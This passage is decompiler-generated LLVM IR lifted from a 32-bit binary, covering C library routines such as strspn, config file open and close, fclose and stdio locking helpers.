  %v3_805431e = inttoptr i32 %v2_805431e to i32*
  store i32 %v0_805431e, i32* %v3_805431e, align 4
  %v0_805431f = load i32, i32* @ebx, align 4
  %v2_805431f = add i32 %v0_8054314, -8
  %v3_805431f = inttoptr i32 %v2_805431f to i32*
  store i32 %v0_805431f, i32* %v3_805431f, align 4
  %v0_8054320 = call i32 @__GI_strspn()
  store i32 %v0_8054320, i32* %eax.global-to-local, align 4
  %v0_8054325 = load i32, i32* @esp, align 4
  %v3_8054325 = add i32 %v0_8054325, 4
  %v0_8054326 = load i32, i32* @ebx, align 4
  %v2_8054326 = add i32 %v0_8054326, %v0_8054320
  store i32 %v2_8054326, i32* @ebx, align 4
  %v1_8054328 = inttoptr i32 %v3_8054325 to i32*
  %v2_8054328 = load i32, i32* %v1_8054328, align 4
  store i32 %v2_8054328, i32* @ecx, align 4
  %v3_8054328 = add i32 %v0_8054325, 8
  br label %dec_label_pc_8054329

dec_label_pc_8054329:                             ; preds = %dec_label_pc_8054314.dec_label_pc_8054329_crit_edge, %dec_label_pc_805431e
  %v4_805432a = phi i32 [ %v4_805432a.pre, %dec_label_pc_8054314.dec_label_pc_8054329_crit_edge ], [ %v0_8054320, %dec_label_pc_805431e ]
  %v0_805432a = phi i32 [ %v0_805432a.pre, %dec_label_pc_8054314.dec_label_pc_8054329_crit_edge ], [ %v2_8054326, %dec_label_pc_805431e ]
  %v0_805433021 = phi i32 [ %v0_8054314, %dec_label_pc_8054314.dec_label_pc_8054329_crit_edge ], [ %v3_8054328, %dec_label_pc_805431e ]
  %v0_8054329 = load i32, i32* @ebp, align 4
  %v1_8054329 = add i32 %v0_8054329, 1
  store i32 %v1_8054329, i32* @ebp, align 4
  %v1_805432a = inttoptr i32 %v0_805432a to i8*
  %v2_805432a = load i8, i8* %v1_805432a, align 1
  %v3_805432a = zext i8 %v2_805432a to i32
  %v5_805432a = and i32 %v4_805432a, -256
  %v6_805432a = or i32 %v3_805432a, %v5_805432a
  store i32 %v6_805432a, i32* %eax.global-to-local, align 4
  %v4_805432c = icmp eq i8 %v2_805432a, 0
  br i1 %v4_805432c, label %dec_label_pc_8054342, label %dec_label_pc_8054330

dec_label_pc_8054330:                             ; preds = %dec_label_pc_8054272, %dec_label_pc_8054329
  %v0_80542a9 = phi i32 [ %v0_805432a, %dec_label_pc_8054329 ], [ %v0_805432a7, %dec_label_pc_8054272 ]
  %v0_8054334 = phi i32 [ %v6_805432a, %dec_label_pc_8054329 ], [ %v6_805432a13, %dec_label_pc_8054272 ]
  %v0_805429f = phi i32 [ %v0_805433021, %dec_label_pc_8054329 ], [ %v1_8054342.pre, %dec_label_pc_8054272 ]
  %v1_8054330 = add i32 %v0_805429f, 56
  %v2_8054330 = inttoptr i32 %v1_8054330 to i32*
  %v3_8054330 = load i32, i32* %v2_8054330, align 4
  %v1_8054334 = trunc i32 %v0_8054334 to i8
  %v3_8054334 = inttoptr i32 %v3_8054330 to i8*
  %v4_8054334 = load i8, i8* %v3_8054334, align 1
  %v15_8054334 = icmp eq i8 %v1_8054334, %v4_8054334
  br i1 %v15_8054334, label %dec_label_pc_8054342, label %dec_label_pc_8054338

dec_label_pc_8054338:                             ; preds = %dec_label_pc_8054330
  %v0_8054338 = load i32, i32* @ebp, align 4
  %v2_8054338 = add i32 %v0_805429f, 16
  %v3_8054338 = inttoptr i32 %v2_8054338 to i32*
  %v4_8054338 = load i32, i32* %v3_8054338, align 4
  %v5_8054338 = sub i32 %v0_8054338, %v4_8054338
  %v11_8054338 = xor i32 %v4_8054338, %v0_8054338
  %v12_8054338 = xor i32 %v5_8054338, %v0_8054338
  %v13_8054338 = and i32 %v12_8054338, %v11_8054338
  %v14_8054338 = icmp slt i32 %v13_8054338, 0
  %v16_8054338 = icmp slt i32 %v5_8054338, 0
  %v2_805433c = icmp eq i1 %v16_8054338, %v14_8054338
  br i1 %v2_805433c, label %dec_label_pc_8054342, label %dec_label_pc_805429f

dec_label_pc_8054342:                             ; preds = %dec_label_pc_8054329, %dec_label_pc_8054330, %dec_label_pc_8054338, %dec_label_pc_8054272
  %v0_8054348 = phi i32 [ %v1_8054342.pre, %dec_label_pc_8054272 ], [ %v0_805433021, %dec_label_pc_8054329 ], [ %v0_805429f, %dec_label_pc_8054330 ], [ %v0_805429f, %dec_label_pc_8054338 ]
  %v0_8054342 = load i32, i32* @ebp, align 4
  %v2_8054342 = add i32 %v0_8054348, 20
  %v3_8054342 = inttoptr i32 %v2_8054342 to i32*
  %v4_8054342 = load i32, i32* %v3_8054342, align 4
  %v5_8054342 = sub i32 %v0_8054342, %v4_8054342
  %v11_8054342 = xor i32 %v4_8054342, %v0_8054342
  %v12_8054342 = xor i32 %v5_8054342, %v0_8054342
  %v13_8054342 = and i32 %v12_8054342, %v11_8054342
  %v14_8054342 = icmp slt i32 %v13_8054342, 0
  %v16_8054342 = icmp slt i32 %v5_8054342, 0
  %v2_8054346 = icmp eq i1 %v16_8054342, %v14_8054342
  br i1 %v2_8054346, label %dec_label_pc_8054358, label %dec_label_pc_8054348

dec_label_pc_8054348:                             ; preds = %dec_label_pc_8054342
  %v1_8054348 = add i32 %v0_8054348, 52
  %v2_8054348 = inttoptr i32 %v1_8054348 to i32*
  %v3_8054348 = load i32, i32* %v2_8054348, align 4
  %v4_8054348 = and i32 %v3_8054348, 1048576
  %v5_8054348 = icmp eq i32 %v4_8054348, 0
  br i1 %v5_8054348, label %dec_label_pc_805412a, label %dec_label_pc_8054356

dec_label_pc_8054356:                             ; preds = %dec_label_pc_8054232, %dec_label_pc_8054348, %dec_label_pc_8054149, %entry
  %v0_8054358.pre = phi i32 [ %v15_80540fc, %entry ], [ %v0_8054358.pre.pre.pre, %dec_label_pc_8054232 ], [ %v0_8054348, %dec_label_pc_8054348 ], [ %v3_805415a, %dec_label_pc_8054149 ]
  store i32 0, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_8054358

dec_label_pc_8054358:                             ; preds = %dec_label_pc_8054342, %dec_label_pc_805418a, %dec_label_pc_8054356
  %v0_805435b = phi i32 [ %v0_805435b.pre, %dec_label_pc_805418a ], [ 0, %dec_label_pc_8054356 ], [ %v0_8054342, %dec_label_pc_8054342 ]
  %v0_8054358 = phi i32 [ %v1_8054199, %dec_label_pc_805418a ], [ %v0_8054358.pre, %dec_label_pc_8054356 ], [ %v0_8054348, %dec_label_pc_8054342 ]
  %v1_8054358 = add i32 %v0_8054358, 24
  store i32 %v0_805435b, i32* %eax.global-to-local, align 4
  %v1_805435d = inttoptr i32 %v1_8054358 to i32*
  %v2_805435d = load i32, i32* %v1_805435d, align 4
  store i32 %v2_805435d, i32* @ebx, align 4
  %v3_805435d = add i32 %v0_8054358, 28
  %v1_805435e = inttoptr i32 %v3_805435d to i32*
  %v2_805435e = load i32, i32* %v1_805435e, align 4
  store i32 %v2_805435e, i32* @esi, align 4
  %v3_805435e = add i32 %v0_8054358, 32
  %v1_805435f = inttoptr i32 %v3_805435e to i32*
  %v2_805435f = load i32, i32* %v1_805435f, align 4
  store i32 %v2_805435f, i32* @edi, align 4
  %v3_805435f = add i32 %v0_8054358, 36
  %v1_8054360 = inttoptr i32 %v3_805435f to i32*
  %v2_8054360 = load i32, i32* %v1_8054360, align 4
  store i32 %v2_8054360, i32* @ebp, align 4
  ret i32 %v0_805435b

; uselistorder directives
  uselistorder i32 %v0_8054358, { 3, 2, 1, 0 }
  uselistorder i32 %v0_805435b, { 1, 0 }
  uselistorder i32 %v5_8054342, { 1, 0 }
  uselistorder i32 %v5_8054338, { 1, 0 }
  uselistorder i32 %v0_8054338, { 0, 1, 4, 2, 3 }
  uselistorder i32 %v0_805429f, { 0, 1, 4, 5, 2, 3 }
  uselistorder i32 %v0_8054320, { 1, 0, 2 }
  uselistorder i32 %v0_8054314, { 2, 1, 0, 3 }
  uselistorder i8 %v2_8054301, { 1, 0, 2 }
  uselistorder i32 %v1_80542f0, { 1, 0 }
  uselistorder i32 %v3_80542df, { 1, 0 }
  uselistorder i32 %v0_80542d9, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v0_80542c5, { 1, 0, 2 }
  uselistorder i32 %v0_80542b8.pre, { 5, 6, 4, 1, 2, 0, 3 }
  uselistorder i32 %v1_8054342.pre, { 1, 0 }
  uselistorder i32 %v0_8054253, { 1, 0, 2 }
  uselistorder i32 %v0_805424c, { 1, 0, 2 }
  uselistorder i32 %v0_8054358.pre.pre.pre, { 0, 2, 1 }
  uselistorder i32 %v3_8054206, { 1, 0, 2, 3 }
  uselistorder i32 %v2_80541fe, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v1_80541c7, { 1, 0 }
  uselistorder i32 %v4_80541b7, { 0, 3, 1, 2 }
  uselistorder i32 %v0_8054183, { 3, 2, 0, 1 }
  uselistorder i8* %v2_80541d1, { 2, 1, 0 }
  uselistorder i32* %v2_8054172, { 4, 5, 3, 6, 1, 2, 0 }
  uselistorder i32* %v3_805416d, { 1, 2, 3, 0, 4, 5 }
  uselistorder i32* %v2_8054165, { 2, 3, 4, 1, 0 }
  uselistorder i32* %v2_805412a, { 1, 2, 3, 4, 0, 5 }
  uselistorder i32 %v1_8054122, { 1, 0 }
  uselistorder i32 %v2_8054118, { 2, 3, 1, 4, 0, 5 }
  uselistorder i8** %stack_var_-40, { 8, 3, 6, 5, 7, 9, 2, 4, 1, 0 }
  uselistorder i32 %tmp42, { 0, 3, 2, 4, 1, 5 }
  uselistorder i32* %eax.global-to-local, { 2, 14, 3, 4, 5, 6, 7, 8, 9, 10, 12, 11, 13, 1, 15, 16, 17, 18, 19, 20, 21, 22, 23, 32, 0, 24, 25, 26, 27, 28, 29, 30, 31, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48 }
  uselistorder i32 1048576, { 2, 1, 3, 0 }
  uselistorder i32 ()* @__GI_strspn, { 1, 0 }
  uselistorder i32 131072, { 3, 4, 1, 2, 0 }
  uselistorder i32 (i32*, i32)* @realloc, { 11, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10 }
  uselistorder i32 81, { 1, 0 }
  uselistorder label %dec_label_pc_8054358, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8054356, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_8054342, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_8054330, { 1, 0 }
  uselistorder label %dec_label_pc_8054329, { 1, 0 }
  uselistorder label %dec_label_pc_8054314, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80542ec, { 1, 0 }
  uselistorder label %dec_label_pc_80542c3, { 1, 0 }
  uselistorder label %dec_label_pc_80542b8, { 1, 0 }
  uselistorder label %dec_label_pc_805425c, { 1, 0 }
  uselistorder label %dec_label_pc_8054232, { 1, 2, 0 }
  uselistorder label %dec_label_pc_8054228, { 1, 0 }
  uselistorder label %dec_label_pc_8054225, { 1, 0 }
  uselistorder label %dec_label_pc_80541fe, { 1, 0 }
  uselistorder label %dec_label_pc_8054165, { 1, 0 }
  uselistorder label %dec_label_pc_8054149, { 1, 0 }
  uselistorder label %dec_label_pc_805413d, { 1, 0 }
}

define i32 @__GI_config_close(i32* %arg1) local_unnamed_addr {
entry:
  %tmp2 = ptrtoint i32* %arg1 to i32
  %stack_var_-4 = alloca i32, align 4
  %v0_8054362 = load i32, i32* @ebx, align 4
  store i32 %v0_8054362, i32* %stack_var_-4, align 4
  %v1_8054367 = icmp eq i32* %arg1, null
  br i1 %v1_8054367, label %entry.dec_label_pc_805438c_crit_edge, label %dec_label_pc_805436b

entry.dec_label_pc_805438c_crit_edge:             ; preds = %entry
  br label %dec_label_pc_805438c

dec_label_pc_805436b:                             ; preds = %entry
  %v2_805436b = load i32, i32* %arg1, align 4
  %v2_805436d = call i32 @__GI_fclose(i32 %v2_805436b, i32 %v0_8054362)
  %v1_8054373 = add i32 %tmp2, 20
  %v2_8054373 = inttoptr i32 %v1_8054373 to i8*
  %v3_8054373 = load i8, i8* %v2_8054373, align 1
  %v4_8054373 = icmp eq i8 %v3_8054373, 0
  br i1 %v4_8054373, label %dec_label_pc_8054382, label %dec_label_pc_8054379

dec_label_pc_8054379:                             ; preds = %dec_label_pc_805436b
  %v1_8054379 = add i32 %tmp2, 4
  %v2_8054379 = inttoptr i32 %v1_8054379 to i32*
  %v3_8054379 = load i32, i32* %v2_8054379, align 4
  %v1_805437c = call i32 @free(i32 %v3_8054379)
  br label %dec_label_pc_8054382

dec_label_pc_8054382:                             ; preds = %dec_label_pc_805436b, %dec_label_pc_8054379
  %v2_8054386 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8054386, i32* @ebx, align 4
  %v1_8054387 = call i32 @free(i32 %tmp2)
  br label %dec_label_pc_805438c

dec_label_pc_805438c:                             ; preds = %entry.dec_label_pc_805438c_crit_edge, %dec_label_pc_8054382
  %v2_805438c = phi i32 [ %v0_8054362, %entry.dec_label_pc_805438c_crit_edge ], [ %v2_8054386, %dec_label_pc_8054382 ]
  %.0 = phi i32 [ undef, %entry.dec_label_pc_805438c_crit_edge ], [ %v1_8054387, %dec_label_pc_8054382 ]
  store i32 %v2_805438c, i32* @ebx, align 4
  ret i32 %.0

; uselistorder directives
  uselistorder i32 undef, { 1, 2, 0, 3 }
  uselistorder i32* null, { 0, 1, 10, 2, 11, 3, 4, 5, 6, 12, 13, 14, 15, 16, 7, 8, 9, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37 }
  uselistorder label %dec_label_pc_805438c, { 1, 0 }
  uselistorder label %dec_label_pc_8054382, { 1, 0 }
}

define i32 @__GI_config_open(i32 %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_805438e = load i32, i32* @ebx, align 4
  store i32 %v0_805438e, i32* %stack_var_-4, align 4
  %v3_8054398 = call i32 @__GI_fopen(i32 %arg1, i32 ptrtoint (i32* @global_var_8055f31.336 to i32), i32 %v0_805438e)
  store i32 %v3_8054398, i32* @ebx, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v1_80543a3 = icmp eq i32 %v3_8054398, 0
  br i1 %v1_80543a3, label %dec_label_pc_80543b8, label %dec_label_pc_80543a7

dec_label_pc_80543a7:                             ; preds = %entry
  %v3_80543ab = call i32 @calloc(i64 1, i32 24)
  store i32 %v3_80543ab, i32* %eax.global-to-local, align 4
  %v1_80543b1 = icmp eq i32 %v3_80543ab, 0
  br i1 %v1_80543b1, label %dec_label_pc_80543b8, label %dec_label_pc_80543b6

dec_label_pc_80543b6:                             ; preds = %dec_label_pc_80543a7
  %v2_80543b6 = inttoptr i32 %v3_80543ab to i32*
  store i32 %v3_8054398, i32* %v2_80543b6, align 4
  %v0_80543b9.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80543b8

dec_label_pc_80543b8:                             ; preds = %dec_label_pc_80543a7, %entry, %dec_label_pc_80543b6
  %v0_80543b9 = phi i32 [ 0, %dec_label_pc_80543a7 ], [ 0, %entry ], [ %v0_80543b9.pre, %dec_label_pc_80543b6 ]
  %v2_80543b8 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_80543b8, i32* @ebx, align 4
  ret i32 %v0_80543b9

; uselistorder directives
  uselistorder i32 (i64, i32)* @calloc, { 36, 1, 0, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35 }
  uselistorder label %dec_label_pc_80543b8, { 2, 0, 1 }
}

define i32 @__GI_fclose(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v1_80543c3 = add i32 %arg1, 52
  %v2_80543c3 = inttoptr i32 %v1_80543c3 to i32*
  %v3_80543c3 = load i32, i32* %v2_80543c3, align 4
  store i32 %v3_80543c3, i32* @esi, align 4
  %v1_80543c6 = icmp eq i32 %v3_80543c3, 0
  %v1_80543c8 = icmp eq i1 %v1_80543c6, false
  call void @__pseudo_cond_branch(i1 %v1_80543c8, i32 134562808)
  %v0_80543ca = load i32, i32* inttoptr (i32 8 to i32*), align 8
  %v0_80543d1 = load i32, i32* @ebx, align 4
  %v1_80543d1 = add i32 %v0_80543d1, 64
  %v2_80543d1 = inttoptr i32 %v1_80543d1 to i32*
  %v3_80543d1 = load i32, i32* %v2_80543d1, align 4
  %v15_80543d1 = icmp eq i32 %v3_80543d1, %v0_80543ca
  call void @__pseudo_cond_branch(i1 %v15_80543d1, i32 134562805)
  store i32 1, i32* %ecx.global-to-local, align 4
  store i32 %v3_80543c3, i32* %eax.global-to-local, align 4
  %v0_80543dd = load i32, i32* inttoptr (i32 12 to i32*), align 4
  %v1_80543dd = icmp eq i32 %v0_80543dd, 0
  call void @__pseudo_cond_branch(i1 %v1_80543dd, i32 134562792)
  %v0_80543e7 = load i32, i32* @ebx, align 4
  %v1_80543e7 = add i32 %v0_80543e7, 56
  %v2_80543e7 = inttoptr i32 %v1_80543e7 to i32*
  %v3_80543e7 = load i32, i32* %v2_80543e7, align 4
  %v4_80543e7 = load i32, i32* %ecx.global-to-local, align 4
  %v5_80543e7 = load i32, i32* %eax.global-to-local, align 4
  %v16_80543e7 = icmp eq i32 %v5_80543e7, %v3_80543e7
  %v23_80543e7 = select i1 %v16_80543e7, i32 %v4_80543e7, i32 %v3_80543e7
  store i32 %v23_80543e7, i32* %v2_80543e7, align 4
  store i32 %v3_80543e7, i32* %eax.global-to-local, align 4
  %v1_80543ec = icmp eq i1 %v16_80543e7, false
  call void @__pseudo_cond_branch(i1 %v1_80543ec, i32 134563128)
  ret i32 %v3_80543e7

; uselistorder directives
  uselistorder i1 %v16_80543e7, { 1, 0 }
  uselistorder i32 %v3_80543e7, { 1, 0, 3, 2 }
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @function_80543f2() local_unnamed_addr {
dec_label_pc_80543f2:
  %edx.global-to-local = alloca i32, align 4
  %v0_80543f2 = load i32, i32* @edx, align 4
  %v1_80543f2 = load i32, i32* @ebx, align 4
  %v2_80543f2 = add i32 %v1_80543f2, 64
  %v3_80543f2 = inttoptr i32 %v2_80543f2 to i32*
  store i32 %v0_80543f2, i32* %v3_80543f2, align 4
  %v0_80543f5 = load i32, i32* @ebx, align 4
  %v1_80543f5 = add i32 %v0_80543f5, 60
  %v2_80543f5 = inttoptr i32 %v1_80543f5 to i32*
  %v3_80543f5 = load i32, i32* %v2_80543f5, align 4
  %v4_80543f5 = add i32 %v3_80543f5, 1
  store i32 %v4_80543f5, i32* %v2_80543f5, align 4
  %v0_80543fa = load i32, i32* @ebx, align 4
  %v1_80543fa = inttoptr i32 %v0_80543fa to i8*
  %v2_80543fa = load i8, i8* %v1_80543fa, align 1
  %v3_80543fa = and i8 %v2_80543fa, 64
  %v4_80543fa = icmp eq i8 %v3_80543fa, 0
  br i1 %v4_80543fa, label %dec_label_pc_80543f2.dec_label_pc_8054408_crit_edge, label %dec_label_pc_80543ff

dec_label_pc_80543f2.dec_label_pc_8054408_crit_edge: ; preds = %dec_label_pc_80543f2
  br label %dec_label_pc_8054408

dec_label_pc_80543ff:                             ; preds = %dec_label_pc_80543f2
  %v1_8054400 = call i32 @fflush_unlocked(i32 %v0_80543fa)
  store i32 %v1_8054400, i32* @eax, align 4
  %v0_8054408.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8054408

dec_label_pc_8054408:                             ; preds = %dec_label_pc_80543f2.dec_label_pc_8054408_crit_edge, %dec_label_pc_80543ff
  %v0_8054408 = phi i32 [ %v0_80543fa, %dec_label_pc_80543f2.dec_label_pc_8054408_crit_edge ], [ %v0_8054408.pre, %dec_label_pc_80543ff ]
  %v1_8054408 = add i32 %v0_8054408, 4
  %v2_8054408 = inttoptr i32 %v1_8054408 to i32*
  %v3_8054408 = load i32, i32* %v2_8054408, align 4
  %v1_805440b = call i32 @__GI___libc_close(i32 %v3_8054408)
  store i32 %v3_8054408, i32* %edx.global-to-local, align 4
  %v2_8054411 = icmp slt i32 %v1_805440b, 0
  %v1_8054413 = icmp eq i1 %v2_8054411, false
  br i1 %v1_8054413, label %dec_label_pc_8054418, label %dec_label_pc_8054415

dec_label_pc_8054415:                             ; preds = %dec_label_pc_8054408
  br label %dec_label_pc_8054418

dec_label_pc_8054418:                             ; preds = %dec_label_pc_8054408, %dec_label_pc_8054415
  %v0_8054418 = load i32, i32* inttoptr (i32 8 to i32*), align 8
  store i32 %v0_8054418, i32* %edx.global-to-local, align 4
  %v0_805441f = load i32, i32* @ebx, align 4
  %v1_805441f = add i32 %v0_805441f, 4
  %v2_805441f = inttoptr i32 %v1_805441f to i32*
  store i32 -1, i32* %v2_805441f, align 4
  %v0_8054426 = load i32, i32* @global_var_805830c.337, align 4
  %v1_8054426 = load i32, i32* %edx.global-to-local, align 4
  %v12_8054426 = icmp eq i32 %v0_8054426, %v1_8054426
  call void @__pseudo_cond_branch(i1 %v12_8054426, i32 ptrtoint (i32* @global_var_8054453.338 to i32))
  %v0_8054435 = load i32, i32* inttoptr (i32 12 to i32*), align 4
  %v1_8054435 = icmp eq i32 %v0_8054435, 0
  call void @__pseudo_cond_branch(i1 %v1_8054435, i32 134562880)
  %v0_805443f = load i32, i32* @global_var_8058304.339, align 4
  %v13_805443f = icmp eq i32 %v0_805443f, 0
  %v20_805443f = select i1 %v13_805443f, i32 1, i32 %v0_805443f
  store i32 %v20_805443f, i32* @global_var_8058304.339, align 4
  %v1_8054447 = icmp eq i1 %v13_805443f, false
  call void @__pseudo_cond_branch(i1 %v1_8054447, i32 134563141)
  ret i32 %v0_805443f

; uselistorder directives
  uselistorder i32 %v0_805443f, { 1, 2, 0 }
  uselistorder i32 (i32)* @__GI___libc_close, { 0, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 6, 5, 4, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 3, 2, 1 }
  uselistorder label %dec_label_pc_8054418, { 1, 0 }
  uselistorder label %dec_label_pc_8054408, { 1, 0 }
}

define i32 @function_805444d() local_unnamed_addr {
dec_label_pc_805444d:
  %v0_805444d = load i32, i32* @edx, align 4
  store i32 %v0_805444d, i32* @global_var_805830c.337, align 4
  %v0_8054453 = load i32, i32* @global_var_8058310.340, align 16
  %v0_8054458 = load i32, i32* @global_var_8058308.341, align 8
  %v1_805445e = add i32 %v0_8054453, 1
  %v1_805445f = icmp eq i32 %v0_8054458, 0
  store i32 %v1_805445e, i32* @global_var_8058310.340, align 16
  %v1_8054466 = icmp eq i1 %v1_805445f, false
  call void @__pseudo_cond_branch(i1 %v1_8054466, i32 134562954)
  store i32 0, i32* @global_var_805830c.337, align 4
  %v0_8054472 = load i32, i32* inttoptr (i32 12 to i32*), align 4
  %v1_8054472 = icmp eq i32 %v0_8054472, 0
  call void @__pseudo_cond_branch(i1 %v1_8054472, i32 134562941)
  %v0_805447c = load i32, i32* @global_var_8058304.339, align 4
  %v1_805447c = add i32 %v0_805447c, -1
  %v9_805447c = icmp eq i32 %v1_805447c, 0
  store i32 %v1_805447c, i32* @global_var_8058304.339, align 4
  %v1_8054484 = icmp eq i1 %v9_805447c, false
  call void @__pseudo_cond_branch(i1 %v1_8054484, i32 134563157)
  ret i32 %v1_805445e

; uselistorder directives
  uselistorder i32 %v1_805447c, { 1, 0 }
}

define i32 @function_805448a() local_unnamed_addr {
dec_label_pc_805448a:
  %v0_805448a = load i32, i32* @ebx, align 4
  %v1_805448a = inttoptr i32 %v0_805448a to i32*
  %v2_805448a = load i32, i32* %v1_805448a, align 4
  %v7_805448c = and i32 %v2_805448a, 24576
  %v1_8054490 = or i32 %v7_805448c, 48
  %v0_8054493 = load i32, i32* @esi, align 4
  %v1_8054493 = icmp eq i32 %v0_8054493, 0
  %v1_8054495 = trunc i32 %v1_8054490 to i16
  %v3_8054495 = inttoptr i32 %v0_805448a to i16*
  store i16 %v1_8054495, i16* %v3_8054495, align 2
  %v1_8054498 = icmp eq i1 %v1_8054493, false
  call void @__pseudo_cond_branch(i1 %v1_8054498, i32 134563009)
  %v0_805449a = load i32, i32* @ebx, align 4
  %v1_805449a = add i32 %v0_805449a, 60
  %v2_805449a = inttoptr i32 %v1_805449a to i32*
  %v3_805449a = load i32, i32* %v2_805449a, align 4
  %v1_805449d = add i32 %v3_805449a, -1
  %v8_805449d = icmp eq i32 %v1_805449d, 0
  store i32 %v1_805449d, i32* %v2_805449a, align 4
  %v1_80544a3 = icmp eq i1 %v8_805449d, false
  call void @__pseudo_cond_branch(i1 %v1_80544a3, i32 134563009)
  %v0_80544a5 = load i32, i32* @ebx, align 4
  %v1_80544a5 = add i32 %v0_80544a5, 64
  %v2_80544a5 = inttoptr i32 %v1_80544a5 to i32*
  store i32 0, i32* %v2_80544a5, align 4
  %v0_80544ac = load i32, i32* inttoptr (i32 12 to i32*), align 4
  %v1_80544ac = icmp eq i32 %v0_80544ac, 0
  call void @__pseudo_cond_branch(i1 %v1_80544ac, i32 134562999)
  %v0_80544b6 = load i32, i32* @ebx, align 4
  %v1_80544b6 = add i32 %v0_80544b6, 56
  %v2_80544b6 = inttoptr i32 %v1_80544b6 to i32*
  %v3_80544b6 = load i32, i32* %v2_80544b6, align 4
  %v4_80544b6 = add i32 %v3_80544b6, -1
  %v12_80544b6 = icmp eq i32 %v4_80544b6, 0
  store i32 %v4_80544b6, i32* %v2_80544b6, align 4
  %v1_80544bb = icmp eq i1 %v12_80544b6, false
  call void @__pseudo_cond_branch(i1 %v1_80544bb, i32 134563173)
  ret i32 %v1_805449d

; uselistorder directives
  uselistorder i32 %v4_80544b6, { 1, 0 }
}

define i32 @function_80544c1() local_unnamed_addr {
dec_label_pc_80544c1:
  %v0_80544c1 = load i32, i32* @ebx, align 4
  %v1_80544c1 = add i32 %v0_80544c1, 1
  %v2_80544c1 = inttoptr i32 %v1_80544c1 to i8*
  %v3_80544c1 = load i8, i8* %v2_80544c1, align 1
  %v4_80544c1 = and i8 %v3_80544c1, 64
  %v5_80544c1 = icmp eq i8 %v4_80544c1, 0
  br i1 %v5_80544c1, label %dec_label_pc_80544d0, label %dec_label_pc_80544c7

dec_label_pc_80544c7:                             ; preds = %dec_label_pc_80544c1
  %v1_80544c7 = add i32 %v0_80544c1, 8
  %v2_80544c7 = inttoptr i32 %v1_80544c7 to i32*
  %v3_80544c7 = load i32, i32* %v2_80544c7, align 4
  %v1_80544ca = call i32 @free(i32 %v3_80544c7)
  br label %dec_label_pc_80544d0

dec_label_pc_80544d0:                             ; preds = %dec_label_pc_80544c1, %dec_label_pc_80544c7
  %v0_80544d0 = load i32, i32* inttoptr (i32 8 to i32*), align 8
  %v0_80544d7 = load i32, i32* @global_var_805830c.337, align 4
  %v12_80544d7 = icmp eq i32 %v0_80544d7, %v0_80544d0
  call void @__pseudo_cond_branch(i1 %v12_80544d7, i32 ptrtoint (i32* @global_var_8054500.342 to i32))
  %v0_80544e6 = load i32, i32* inttoptr (i32 12 to i32*), align 4
  %v1_80544e6 = icmp eq i32 %v0_80544e6, 0
  call void @__pseudo_cond_branch(i1 %v1_80544e6, i32 134563057)
  %v0_80544f0 = load i32, i32* @global_var_8058304.339, align 4
  %v13_80544f0 = icmp eq i32 %v0_80544f0, 0
  %v20_80544f0 = select i1 %v13_80544f0, i32 1, i32 %v0_80544f0
  store i32 %v20_80544f0, i32* @global_var_8058304.339, align 4
  %v1_80544f8 = icmp eq i1 %v13_80544f0, false
  call void @__pseudo_cond_branch(i1 %v1_80544f8, i32 134563186)
  ret i32 %v0_80544f0

; uselistorder directives
  uselistorder i32 %v0_80544f0, { 1, 2, 0 }
  uselistorder label %dec_label_pc_80544d0, { 1, 0 }
}

define i32 @function_80544fa() local_unnamed_addr {
dec_label_pc_80544fa:
  %v0_80544fa = load i32, i32* @edx, align 4
  store i32 %v0_80544fa, i32* @global_var_805830c.337, align 4
  %v0_8054500 = load i32, i32* @global_var_8058308.341, align 8
  %v0_8054505 = load i32, i32* @global_var_8058314.343, align 4
  %v1_8054505 = add i32 %v0_8054505, 1
  store i32 %v1_8054505, i32* @global_var_8058314.343, align 4
  %v1_805450b = icmp eq i32 %v0_8054500, 0
  %v1_805450d = icmp eq i1 %v1_805450b, false
  call void @__pseudo_cond_branch(i1 %v1_805450d, i32 134563117)
  store i32 0, i32* @global_var_805830c.337, align 4
  %v0_8054519 = load i32, i32* inttoptr (i32 12 to i32*), align 4
  %v1_8054519 = icmp eq i32 %v0_8054519, 0
  call void @__pseudo_cond_branch(i1 %v1_8054519, i32 134563108)
  %v0_8054523 = load i32, i32* @global_var_8058304.339, align 4
  %v1_8054523 = add i32 %v0_8054523, -1
  %v9_8054523 = icmp eq i32 %v1_8054523, 0
  store i32 %v1_8054523, i32* @global_var_8058304.339, align 4
  %v1_805452b = icmp eq i1 %v9_8054523, false
  call void @__pseudo_cond_branch(i1 %v1_805452b, i32 134563202)
  ret i32 %v0_8054500

; uselistorder directives
  uselistorder i32 %v1_8054523, { 1, 0 }
}

define i32 @function_805452d() local_unnamed_addr {
dec_label_pc_805452d:
  %v0_805452d = call i32 @_stdio_openlist_dec_use()
  %v0_8054532 = load i32, i32* @edi, align 4
  ret i32 %v0_8054532
}

define i32 @_L_lock_18() local_unnamed_addr {
entry:
  %v0_8054538 = load i32, i32* @ebx, align 4
  %v1_8054538 = add i32 %v0_8054538, 56
  store i32 %v1_8054538, i32* @ecx, align 4
  %v0_805453b = call i32 @__lll_lock_wait_private()
  store i32 %v0_805453b, i32* @eax, align 4
